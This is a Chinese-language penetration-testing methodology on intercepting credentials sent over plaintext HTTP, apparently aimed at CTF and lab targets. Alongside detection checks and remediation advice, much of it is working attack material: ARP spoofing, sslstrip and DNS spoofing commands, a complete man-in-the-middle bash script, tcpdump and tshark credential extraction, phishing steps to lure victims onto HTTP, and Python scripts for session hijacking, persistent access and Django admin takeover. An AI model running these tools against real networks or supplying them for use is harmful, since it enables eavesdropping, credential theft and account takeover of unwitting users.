# 凭证拦截攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的凭证拦截攻击检测与利用流程，帮助发现和利用因传输层安全缺陷导致的凭证泄露漏洞。

## 1.2 适用范围

本文档适用于所有未使用加密传输或传输层配置不当的 Web 应用，特别是：
- 仅使用 HTTP 协议的应用
- HTTP 和 HTTPS 混用的应用
- 缺少 HSTS 配置的应用
- Cookie 缺少 Secure 标志的应用

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

凭证拦截攻击是指攻击者通过网络嗅探、中间人攻击等手段，截获客户端与服务器之间传输的认证凭证（用户名、密码、会话 Cookie 等）。

**本质问题**：
- 应用使用 HTTP 明文传输认证数据
- Cookie 缺少 Secure 标志，可通过 HTTP 传输
- 缺少 HSTS 强制 HTTPS 连接
- 网络层无加密保护

### 技术细节

**典型攻击场景**：

```
攻击者位置：
├── 同一 WiFi 网络（咖啡厅、机场）
├── ARP 欺骗位置
├── DNS 欺骗位置
├── 恶意路由器
└── ISP 级别监听

拦截内容：
├── POST 表单中的用户名/密码
├── HTTP Cookie（会话令牌）
├── Authorization 头部
└── URL 中的敏感参数
```

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-319 | 明文传输敏感信息 |
| CWE-523 | 不安全的传输 |
| CWE-614 | Cookie 敏感信息暴露 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 登录页面 | `POST /login` | 用户名密码明文传输 |
| 会话管理 | Cookie 传输 | 会话令牌被截获 |
| API 调用 | `Authorization` 头部 | API 令牌泄露 |
| 密码重置 | 重置链接 | 重置令牌被截获 |
| 文件上传 | 上传表单 | 敏感文件内容泄露 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒测试

**HTTP 协议检测**：

```bash
# 检测应用是否仅使用 HTTP
curl -I http://target.com/

# 检查是否有 HTTPS 重定向
curl -I http://target.com/login
# 如果返回 200 OK 而非 301/302 到 HTTPS，则存在风险

# 检查 HSTS 头部
curl -I https://target.com/ | grep -i "strict-transport"
# 无输出表示未配置 HSTS
```

**Cookie 安全标志检测**：

```bash
# 登录并检查 Cookie 标志
curl -X POST http://target.com/login \
  -d "username=test&password=test" \
  -v 2>&1 | grep "Set-Cookie"

# 检查输出：
# ❌ 危险：Set-Cookie: session=xxx; Path=/
# ✅ 安全：Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=Lax
```

**网络嗅探测试**：

```bash
# 使用 tcpdump 捕获 HTTP 流量
sudo tcpdump -i en0 -s 0 -w capture.pcap port 80

# 使用 Wireshark 分析
# 过滤器：http.request.method == "POST"

# 提取 POST 数据
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.file_data
```

### 2.3.2 中间人攻击测试

**ARP 欺骗设置**：

```bash
# 使用 bettercap 进行 ARP 欺骗
sudo bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on"

# 使用 arpspoof
arpspoof -i en0 -t 192.168.1.100 192.168.1.1
arpspoof -i en0 -t 192.168.1.1 192.168.1.100
```

**流量拦截**：

```bash
# 使用 sslstrip 降级 HTTPS 到 HTTP
sslstrip -l 8080 -w output.log

# 使用 mitmproxy 拦截和修改流量
mitmproxy --mode transparent --listen-port 8080
```

### 2.3.3 自动化检测脚本

```python
#!/usr/bin/env python3
"""
凭证拦截漏洞检测脚本
检测 HTTP 明文传输和 Cookie 安全配置
"""

import requests
import sys

class CredentialInterceptionDetector:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []

    def check_http_only(self):
        """检查是否仅使用 HTTP"""
        try:
            response = self.session.get(self.base_url, timeout=5)
            if response.url.startswith('http://'):
                self.vulnerabilities.append({
                    'type': 'HTTP_ONLY',
                    'severity': 'HIGH',
                    'description': '应用使用 HTTP 明文传输'
                })
                return True
        except:
            pass
        return False

    def check_https_redirect(self):
        """检查 HTTPS 重定向"""
        http_url = self.base_url.replace('https://', 'http://')
        try:
            response = self.session.get(http_url, timeout=5, allow_redirects=False)
            location = response.headers.get('Location', '')
            if not location.startswith('https://'):
                self.vulnerabilities.append({
                    'type': 'NO_HTTPS_REDIRECT',
                    'severity': 'MEDIUM',
                    'description': 'HTTP 到 HTTPS 重定向缺失'
                })
                return True
        except:
            pass
        return False

    def check_hsts(self):
        """检查 HSTS 配置"""
        https_url = self.base_url.replace('http://', 'https://')
        try:
            response = self.session.get(https_url, timeout=5)
            if 'strict-transport-security' not in response.headers:
                self.vulnerabilities.append({
                    'type': 'NO_HSTS',
                    'severity': 'MEDIUM',
                    'description': '缺少 HSTS 头部配置'
                })
                return True
        except:
            pass
        return False

    def check_cookie_flags(self, login_url, credentials):
        """检查 Cookie 安全标志"""
        try:
            response = self.session.post(login_url, data=credentials)
            cookies = response.cookies

            for cookie in cookies:
                issues = []
                if not cookie.secure:
                    issues.append('Missing Secure flag')
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append('Missing HttpOnly flag')
                if not cookie.has_nonstandard_attr('SameSite'):
                    issues.append('Missing SameSite flag')

                if issues:
                    self.vulnerabilities.append({
                        'type': 'INSECURE_COOKIE',
                        'severity': 'HIGH',
                        'cookie_name': cookie.name,
                        'issues': issues
                    })
                    return True
        except:
            pass
        return False

    def run_detection(self, login_url=None, credentials=None):
        """运行完整检测"""
        print(f"[*] Scanning target: {self.base_url}")
        print()

        self.check_http_only()
        self.check_https_redirect()
        self.check_hsts()

        if login_url and credentials:
            self.check_cookie_flags(login_url, credentials)

        # 输出结果
        if self.vulnerabilities:
            print(f"[!] Found {len(self.vulnerabilities)} vulnerability/vulnerabilities:")
            for vuln in self.vulnerabilities:
                print(f"  [{vuln['severity']}] {vuln['type']}: {vuln['description']}")
        else:
            print("[+] No credential interception vulnerabilities found")

        return self.vulnerabilities

def main():
    if len(sys.argv) < 2:
        print("Usage: python credential_interception.py <target_url> [login_url] [username] [password]")
        print("Example: python credential_interception.py http://localhost:8080 /login admin password123")
        sys.exit(1)

    base_url = sys.argv[1]
    login_url = sys.argv[2] if len(sys.argv) > 2 else None
    username = sys.argv[3] if len(sys.argv) > 3 else None
    password = sys.argv[4] if len(sys.argv) > 4 else None

    detector = CredentialInterceptionDetector(base_url)

    credentials = None
    if username and password:
        credentials = {'username': username, 'password': password}

    detector.run_detection(login_url, credentials)

if __name__ == '__main__':
    main()
```

## 2.4 漏洞利用方法

### 2.4.1 网络嗅探攻击

```bash
# 前提：攻击者与目标在同一网络

# 步骤 1：启动流量捕获
sudo tcpdump -i en0 -s 0 -w capture.pcap 'tcp port 80'

# 步骤 2：诱导目标访问 HTTP 页面
# 发送钓鱼邮件或短信，包含 http://target.com 链接

# 步骤 3：等待目标登录
# 目标在 HTTP 页面输入凭证

# 步骤 4：分析捕获文件
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.file_data -e ip.src

# 步骤 5：提取凭证
strings capture.pcap | grep -E "username=|password=|session="
```

### 2.4.2 会话 Cookie 劫持

```python
#!/usr/bin/env python3
"""
会话 Cookie 劫持脚本
使用截获的 Cookie 访问受害者账户
"""

import requests
import sys

def hijack_session(target_url, stolen_cookie):
    """使用被盗 Cookie 访问目标"""
    session = requests.Session()
    session.cookies['session'] = stolen_cookie

    # 访问受保护页面
    response = session.get(f'{target_url}/dashboard')

    if response.status_code == 200:
        print("[+] Session hijack successful!")

        # 提取用户信息
        import re
        welcome = re.search(r'Welcome, ([^<]+)', response.text)
        if welcome:
            print(f"[+] Logged in as: {welcome.group(1)}")

        # 检查是否有敏感数据
        if 'FLAG' in response.text:
            flag = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag:
                print(f"[!] FLAG: {flag.group()}")

        return response.text
    else:
        print("[-] Session hijack failed")
        return None

def main():
    if len(sys.argv) < 3:
        print("Usage: python session_hijack.py <target_url> <stolen_cookie>")
        sys.exit(1)

    target_url = sys.argv[1]
    stolen_cookie = sys.argv[2]

    hijack_session(target_url, stolen_cookie)

if __name__ == '__main__':
    main()
```

### 2.4.3 中间人攻击完整流程

```bash
#!/bin/bash
# 完整中间人攻击流程

TARGET="192.168.1.100"
GATEWAY="192.168.1.1"
INTERFACE="en0"

echo "[*] Starting Man-in-the-Middle attack..."

# 步骤 1：启用 IP 转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 步骤 2：启动 ARP 欺骗
arpspoof -i $INTERFACE -t $TARGET $GATEWAY &
arpspoof -i $INTERFACE -t $GATEWAY $TARGET &

# 步骤 3：启动 sslstrip（降级 HTTPS）
sslstrip -l 8080 -w mitm_output.log &

# 步骤 4：启动流量捕获
tcpdump -i $INTERFACE -s 0 -w mitm_capture.pcap port 80 or port 8080 &

echo "[*] MITM attack running. Press Ctrl+C to stop."

# 等待攻击完成...
# Ctrl+C 后清理
killall arpspoof sslstrip tcpdump
echo 0 > /proc/sys/net/ipv4/ip_forward

# 步骤 5：分析结果
echo "[*] Analyzing captured data..."
grep -i "password\|session\|cookie" mitm_output.log
```

### 2.4.4 CTF Flag 获取完整流程

```bash
#!/bin/bash
# 凭证拦截获取 CTF Flag 完整流程

TARGET="http://localhost:40477"

echo "[*] Step 1: Verify HTTP-only deployment"
curl -I $TARGET | grep -i "http/"

echo "[*] Step 2: Check for missing Secure flag"
curl -X POST "$TARGET/password/test" \
  -d "password=test" \
  -v 2>&1 | grep "Set-Cookie"

echo "[*] Step 3: Capture session cookie"
COOKIE=$(curl -s -X POST "$TARGET/password/test" \
  -d "password=test" \
  -c - 2>&1 | grep "session" | awk '{print $NF}')

echo "[+] Captured session: $COOKIE"

echo "[*] Step 4: Use intercepted session to access dashboard"
curl -b "session=$COOKIE" "$TARGET/dashboard" | grep -oP 'FLAG\{[^}]+\}'
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过 HTTPS 强制

```bash
# 如果应用有 HTTPS 但配置不当

# 方法 1：SSLStrip 降级
sslstrip -l 8080

# 方法 2：DNS 欺骗
dnsspoof -i en0 target.com

# 方法 3：混合内容利用
# 如果 HTTPS 页面加载 HTTP 资源，可拦截 HTTP 请求
```

### 2.5.2 绕过 Cookie 加密

```python
# 如果 Cookie 被加密，尝试以下方法

# 方法 1：寻找密钥泄露
# 检查源代码、配置文件、错误消息

# 方法 2：会话预测
# 如果会话 ID 可预测，无需解密

# 方法 3：重放攻击
# 直接重放截获的 Cookie，无需解密
```

### 2.5.3 持久化访问

```python
#!/usr/bin/env python3
"""
使用截获的凭证建立持久化访问
"""

import requests
import time

def maintain_access(target_url, stolen_credentials):
    """定期验证凭证有效性"""
    session = requests.Session()

    # 尝试登录
    if 'session' in stolen_credentials:
        session.cookies['session'] = stolen_credentials['session']
    elif 'username' in stolen_credentials:
        session.post(f'{target_url}/login', data=stolen_credentials)

    # 定期访问保持会话活跃
    while True:
        try:
            response = session.get(f'{target_url}/dashboard')
            if response.status_code == 200:
                print(f"[+] Access maintained at {time.strftime('%H:%M:%S')}")
            else:
                print("[-] Session expired, need new credentials")
                break
        except:
            print("[-] Connection failed")
            break

        time.sleep(300)  # 每 5 分钟检查一次

if __name__ == '__main__':
    # 使用截获的凭证
    credentials = {'session': 'eyJ1c2VyX2lkIjoxMDAzMn0...'}
    maintain_access('http://target.com', credentials)
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 攻击类型 | 工具/命令 | 说明 |
|---------|----------|------|
| 流量捕获 | `tcpdump -i en0 port 80 -w capture.pcap` | 捕获 HTTP 流量 |
| ARP 欺骗 | `arpspoof -i en0 -t target gateway` | 中间人定位 |
| HTTPS 降级 | `sslstrip -l 8080` | 降级到 HTTP |
| Cookie 提取 | `grep "Set-Cookie" response.txt` | 提取 Cookie |
| 会话劫持 | `curl -b "session=xxx" target.com` | 使用被盗会话 |

## 3.2 检测清单

```
□ 检查应用是否仅使用 HTTP
□ 检查 HTTPS 重定向配置
□ 检查 HSTS 头部配置
□ 检查 Cookie Secure 标志
□ 检查 Cookie HttpOnly 标志
□ 检查 Cookie SameSite 标志
□ 测试网络嗅探可行性
□ 测试中间人攻击可行性
```

## 3.3 完整攻击脚本

```python
#!/usr/bin/env python3
"""
凭证拦截完整攻击脚本
集检测、拦截、利用于一体
"""

import requests
import subprocess
import time
import sys

class CredentialInterceptionAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def detect_vulnerabilities(self):
        """检测凭证拦截漏洞"""
        vulns = []

        # 检查 HTTP
        if self.target_url.startswith('http://'):
            vulns.append('HTTP_ONLY')

        # 检查 Cookie 标志
        try:
            response = self.session.post(f'{self.target_url}/password/test',
                                        data={'password': 'test'})
            cookie_header = response.headers.get('Set-Cookie', '')
            if 'Secure' not in cookie_header:
                vulns.append('MISSING_SECURE_FLAG')
            if 'HttpOnly' not in cookie_header:
                vulns.append('MISSING_HTTPONLY')
        except:
            pass

        return vulns

    def intercept_credentials(self, interface='en0'):
        """执行凭证拦截"""
        print(f"[*] Starting credential interception on {interface}...")

        # 启动 tcpdump
        cmd = f"sudo tcpdump -i {interface} -s 0 -w capture.pcap 'tcp port 80'"
        process = subprocess.Popen(cmd, shell=True)

        print("[*] Capturing traffic for 60 seconds...")
        time.sleep(60)

        process.terminate()

        # 分析捕获
        return self.analyze_capture()

    def analyze_capture(self):
        """分析捕获的凭证"""
        try:
            result = subprocess.run(
                ['tshark', '-r', 'capture.pcap',
                 '-Y', 'http.request.method == POST',
                 '-T', 'fields', '-e', 'http.file_data'],
                capture_output=True, text=True
            )

            credentials = []
            for data in result.stdout.split('\n'):
                if 'password=' in data or 'session=' in data:
                    credentials.append(data)

            return credentials
        except:
            return []

    def hijack_session(self, stolen_cookie):
        """会话劫持"""
        session = requests.Session()
        session.cookies['session'] = stolen_cookie

        response = session.get(f'{self.target_url}/dashboard')
        return response.text

    def run_full_attack(self, interface='en0'):
        """执行完整攻击"""
        print(f"[*] Target: {self.target_url}")

        # 检测
        vulns = self.detect_vulnerabilities()
        if vulns:
            print(f"[+] Vulnerabilities found: {', '.join(vulns)}")
        else:
            print("[-] No vulnerabilities found")
            return

        # 拦截
        credentials = self.intercept_credentials(interface)
        if credentials:
            print(f"[+] Intercepted {len(credentials)} credential(s)")

            # 利用
            for cred in credentials:
                if 'session=' in cred:
                    cookie = cred.split('session=')[1].split('&')[0]
                    print(f"[*] Attempting session hijack...")
                    data = self.hijack_session(cookie)

                    if 'FLAG' in data:
                        import re
                        flag = re.search(r'FLAG\{[^}]+\}', data)
                        if flag:
                            print(f"[!] FLAG: {flag.group()}")
                            return flag.group()

        return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python cred_intercept.py <target_url> [interface]")
        sys.exit(1)

    target = sys.argv[1]
    interface = sys.argv[2] if len(sys.argv) > 2 else 'en0'

    attacker = CredentialInterceptionAttack(target)
    result = attacker.run_full_attack(interface)

    if result:
        print(f"\n[+] Attack successful! Flag: {result}")
    else:
        print("\n[-] Attack failed")

if __name__ == '__main__':
    main()
```

## 3.4 Django 会话劫持专项

**场景**：Django 应用 HTTP-only 部署，Session Cookie 无 Secure 标志

**漏洞配置**（`/app/webapp/settings.py`）：
```python
# 缺失的配置（使用 Django 默认值）
# SESSION_COOKIE_SECURE = False  # Cookie 可通过 HTTP 传输
# SECURE_SSL_REDIRECT = False    # 无 HTTPS 重定向
# SESSION_COOKIE_AGE = 1209600   # 14 天会话有效期
```

**利用步骤 1：确认 Cookie 安全标志**
```bash
curl -X POST http://localhost:45121/admin/login/ \
  -d "username=test&password=test" \
  -v 2>&1 | grep "Set-Cookie"

# 输出：
# Set-Cookie: sessionid=abc123; HttpOnly; Max-Age=1209600; Path=/; SameSite=Lax
# 注意：缺少 Secure 标志
```

**利用步骤 2：网络嗅探捕获会话**
```bash
# 在同一网络监听 HTTP 流量
sudo tcpdump -i en0 -s 0 -w capture.pcap 'tcp port 45121'

# 诱导管理员访问 HTTP 页面并登录
# 发送钓鱼链接：http://localhost:45121/admin/

# 分析捕获文件提取会话 Cookie
tshark -r capture.pcap -Y "http.cookie" \
  -T fields -e http.cookie | grep sessionid
```

**利用步骤 3：会话劫持访问 Admin**
```python
import requests

# 使用截获的会话 Cookie
stolen_session = 'abc123...'

session = requests.Session()
session.cookies['sessionid'] = stolen_session

# 访问 Django Admin
response = session.get('http://localhost:45121/admin/')

if response.status_code == 200:
    print("[+] Admin access granted!")
    
    # 提取敏感信息
    import re
    if 'FLAG' in response.text:
        flag = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag:
            print(f"[!] FLAG: {flag.group()}")
```

**利用步骤 4：持久化访问**
```python
# 会话有效期 14 天，可长期访问
# 定期访问保持会话活跃
def maintain_access():
    while True:
        response = session.get('http://localhost:45121/admin/')
        if response.status_code == 200:
            print(f"[+] Access maintained")
        else:
            print("[-] Session expired")
            break
        time.sleep(3600)  # 每小时检查一次
```

**攻击影响**：
- 完全接管管理员账户
- 访问所有 Django Admin 功能
- 创建/删除用户
- 修改系统配置
- 访问敏感数据

## 3.5 修复建议

1. **强制 HTTPS** - 所有通信使用 HTTPS，配置 HTTP 到 HTTPS 重定向
2. **配置 HSTS** - 添加 `Strict-Transport-Security` 头部
3. **Secure Cookie** - 所有 Cookie 设置 Secure 标志
4. **HttpOnly Cookie** - 会话 Cookie 设置 HttpOnly 标志
5. **SameSite Cookie** - 设置 SameSite=Lax 或 Strict
6. **网络隔离** - 使用 VLAN、网络分段保护敏感流量